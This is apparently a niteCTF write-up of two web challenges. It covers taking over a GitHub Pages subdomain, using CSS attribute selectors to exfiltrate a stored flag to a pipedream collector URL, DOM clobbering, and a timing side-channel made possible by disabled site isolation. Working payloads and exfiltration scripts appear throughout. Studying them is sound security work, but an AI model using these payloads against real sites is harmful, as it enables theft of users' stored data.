---
layout: post
current: post
cover: assets/nite/nisala/cover.png
navigation: True
title: "un(documented)-js-api"
date: 2022-12-27 10:00:00
tags: [niteCTF, web]
class: post-template
subclass: 'post'
author: nisala
---

DOM clobbering, domain takeovers, shared process slowdowns, and CSS exfiltration, oh my!

These challenges were really something. While they were often broken (undocumented js-api was literally unsolvable for the first 24 hours that it was up), the core of the challenges were honestly pretty brilliant. Let's talk through them.

### First stop: undocumented js-api

In this challenge, we're greeted with a Notes app. We can input HTML into the box, which can then be rendered. All good so far. To solve the challenge, we have to submit a URL to an admin bot, which visits it with the flag in local storage (previous note is always stored there, because there's a function to restore the last note). 

At first glance, it looks like the notes app has an iframe API -- but you can only activate it if the iframe is embedded in a subdomain of the challenge (hosted at `chall1.jsapi.tech`):

```js
const parseUrl = (url) => {
    return (new URL(url)).host.endsWith(".jsapi.tech");
};
```

In a lot of challenges, the bug would be here. But this uses the `URL` constructor. We're not breaking this. So how do we do this? Well, I noticed that when you visit any subdomain of `jsapi.tech`, you get a GitHub Pages 404 page. So every subdomain is hooked into GitHub Pages. Now, this wouldn't normally be exploitable -- but GitHub doesn't tie registered domains to user accounts. Instead, they expect you to register DNS to a domain and then immediately publish to it. If you don't, *anyone can publish to it later on*. And that's exactly the exploit here. So I just made a repo and published to `squ1rrel.jsapi.tech`, and I'm in!

Now, we have to use the iframe API to get the flag. Unfortunately, we can't just put a script in -- not only because of a Content Security Policy, but because the Notes app is using `DOMPurify`. Lucky for us, though, they're using it insecurely:

```js
DOMPurify.sanitize(str, {ADD_TAGS: ['link','style']}); // allow CSS
```

We can get CSS in! Now, CSS seems innocuous on its own -- but the previous note's data (i.e. the flag) is stored in an attribute called `data-last` on the textarea, which we can select for in CSS! Check this out:

```css
textarea[data-last^='nite{a'] {
    background: url("https://LINK.x.pipedream.net/exfiltrate?data=nite.a");
}
```

If the `data-last` attribute starts with `nite{a`, then the URL is called, sending us the data `nite.a`. Now, we know that the flag starts with `a`, and we can add on another letter to test it out. By doing this over and over, we can get the entire flag.

Now, obviously, I don't want to write all this CSS out myself, so I wrote a little script to generate CSS files for me:

```js
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_}';
const prefix = "n";
const setPrefix = prefix.replace("{", ".");
let css = "";
for (let c1 of characters) {
    css += `textarea[data-last^='${prefix}${c1}'] {
        background: url("https://LINK.x.pipedream.net/exfiltrate?data=${setPrefix}${c1.replace("}", ".")}");
    }
    
    `;
}

const fs = require("fs");
fs.writeFileSync("test.css", css);
```

I modified this script to get me up to three characters at a time (just more `for` loops), but for simplicity, I'm just showing one at a time here. In order to get the CSS on the page, I used the iframe API like this:

```js
const ORIGIN = "https://chall1.jsapi.tech";
window.addEventListener("message", function(event) {
    if (event.origin !== ORIGIN) return;
    if (event.data === "NOTE_APP_API_LOADED") {
        document.querySelector("iframe").contentWindow.postMessage(`NOTE_APP_SET_REQUEST any text here<link rel="stylesheet" href="https://squ1rrel.jsapi.tech/test.css?t=${Math.random()}"></link>`, ORIGIN);
    }

    fetch("https://enu819t2ymo3d.x.pipedream.net/?data=" + encodeURIComponent(event.data));
});
```

When the API loads, this sets a note with the CSS link, which does the exfiltration as described above. I add `Math.random()` on the end to stop CSS caching (as we found out later, this was required because they weren't using an Incognito browser context). You'll notice that the note starts with "any text here". That's because, for some reason, [DOMPurify removes allowed tags if they're the first tag](https://github.com/cure53/DOMPurify/issues/683), so you just have to put something before it.

As I got more characters, I would add them to the prefix, regenerate the CSS, redeploy it to GitHub Pages, and submit to the admin bot again. And eventually, I had the flag!

### Another one: js-api

js-api claimed to be better documented. Honestly, the documentation was incredibly pointless -- it was clear what was and wasn't vulnerable, and that was kinda that. But let's break it down anyways. This is, once again, a Notes app with an iframe API. This API let you preview a note (to a div), set a note (to an internal variable), or search a note (search that internal variable). Here's the search function:

```js
search(text) {
    if ( typeof text !== 'string' ) return;
    if ( !window.enable_experimental_features ) return;

    // some massive security warning I've removed
    // because honestly it made the challenge more confusing
    text = DOMPurify.sanitize( text );
    const doesMatch = this.noteData.includes(text);
    if ( doesMatch ) {
        var lastIndex = 0, i = 0;
        for (...) {
            if ( lastIndex > i ) break;

            this.highlightNode.innerHTML 
                += escapeHtml(this.noteData.substring(lastIndex, i));
            this.highlightNode.innerHTML 
                += `<mark>${escapeHtml( text ) }</mark>`
            
            lastIndex = i + text.length;
        }
        document.querySelector('#note-text-highlight-wrapper').classList.remove('hidden');
    }
}
```

Okay, so `search` has a security warning in it, so it's obviously vulnerable. In order to use it, though, we have to set `window.enable_experimental_features`. We can do this with DOM clobbering. Simply use the `preview` function like so:

```js
iframeWindow.postMessage({
    op: "preview",
    payload: `1<p id="enable_experimental_features">clobber</p>`
}, ORIGIN);
```

And we're good to go -- the variable is set! Now, let's look at what the search function is actually doing. If we search for a piece of text, *and it's in the note*, it'll start populating a new "search results" div. It'll put the contents of the note in the div, and it'll highlight what the search matched in the note. Now, by itself, this is pretty worthless -- but there are two key things the admin bot is doing that actually makes this the key to the solution.

```js
const flag2 = 'nite{549387f2-00fc-4f70-a769-c8887f8dca65}'.repeat(1000);
```

Okay, the flag is repeated 1000 times, and it's super long. You'll notice that the search function uses `innerHTML` and appends to it over and over -- so with this much text, it'll definitely cause significant browser lag. Now, normally, the iframe would run in a different process from the page it's contained in, so the main page wouldn't be able to notice this. But the admin bot has done one more key thing:

```js
puppeter_args.args = [
    '--disable-site-isolation-trials',
    '--user-data-dir=/tmp/chrome-userdata',
    '--breakpad-dump-location=/tmp/chrome-crashes'
];
```

Disable site isolation trials? Whatever could that mean?

> After you disable the isolation policy, Chrome uses its pre-site isolation process model to render websites. Different sites might share processes with each other. And cross-site frames might be rendered in the same process as their parent page.

Cross-site frames in the same process as their parent page, you say? Well, well, well! Looks like we'll be able to detect it after all! So here's what we do:

```js
const characters = "abcdefghijklmnopqrstuvwxyz0123456789_-}";
let prefix = `nite{${location.hash.replace("#", "")}`;
while (!prefix.includes("}")) {
    for (let character of characters) {
        let now = Date.now();
        iframeWindow.postMessage({
            op: "search",
            payload: `${prefix}${character}`
        }, ORIGIN);                
        await new Promise(resolve => setTimeout(resolve, 10));
        if (Date.now() - now > 100) {
            console.log(prefix + character);
            prefix += character;
            fetch("https://LINK.x.pipedream.net/exfiltrate?data=" 
                + prefix.replace("{", ".").replace("}", "."));
            break;
        }
    }
}
```

This dynamically tries to search for the flag, using the flag prefix we already know. After dispatching a search, it sets a 10 millisecond timeout, which tells the Chrome event scheduler to move onto something else (thus ensuring that the search runs and it doesn't just move on immediately). If the search takes more than 100 milliseconds (i.e. 10x the time of the timeout!), it's gotten hung up, which means it was probably displaying search results! Thus, it sends that out to us, and tries to find the next character.

There's a 60 second timeout on the admin bot, so we have to run this a couple times (which is why I made it so you could tack the known prefix onto the URL). But after a few tries, we got the flag!
